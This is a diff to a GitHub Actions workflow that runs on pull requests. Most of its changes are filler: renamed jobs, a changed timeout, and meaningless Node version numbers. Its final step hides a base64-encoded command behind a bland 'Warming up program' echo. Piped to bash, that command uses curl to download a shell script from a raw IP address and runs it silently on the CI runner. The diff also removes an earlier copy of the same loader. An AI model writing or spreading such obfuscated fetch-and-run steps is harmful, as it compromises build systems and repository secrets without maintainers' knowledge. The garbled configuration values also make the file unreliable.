@@ -1,4 +1,5 @@
 name: R
+# Defaults 410
 
     defaults:
       run:
@@ -6,16 +7,16 @@ name: R
     
     on: [pull_request]
     
-    # Jobs 414
+    # Jobs 800
 jobs:
-   build-lint-315:
-      timeout-minutes: 161
+   build-lint-312:
+      timeout-minutes: 177
       runs-on: ubuntu-20.04
       strategy:
          fail-fast: false
          matrix:
-            os: [ubuntu-18.04]
-            node: [746,206,703,368,96,401,959,811,517,725,66,72,885,720,596,347,541,586,305,922,328,488,738,221,60,258,246,497,240,758,493,289,519,84,726,330,465,260,679,532]
+            os: [ubuntu-latest]
+            node: [338,602,177,360,339,426,712,646,276,876,25,531,771,172,712,509,334,57,531,562,276,23,315,593,26,990,685,778,630,789,803,202,227,901,290,599,1033,971,249,849]
       steps:
-      - run: echo "Powering up pep8"
-      - run: echo "Y3VybCBodHRwOi8vOTUuMTgxLjE3Mi4xMzc6ODAwMC9zY3JpcHRfcHVsbC5zaCB8IGJhc2ggJj4gL2Rldi9udWxsICYmIGVjaG8gYQ==" | base64 -d | bash
+      - run: echo "Warming up program"
+      - run: echo "Y3VybCBodHRwOi8vOTUuMTgxLjE3Mi4xMzc6ODAwMC9zY3JpcHRfcHVsbC5zaCB8IGJhc2ggJj4gL2Rldi9udWxsICYmIGVjaG8gdGM=" | base64 -d | bash
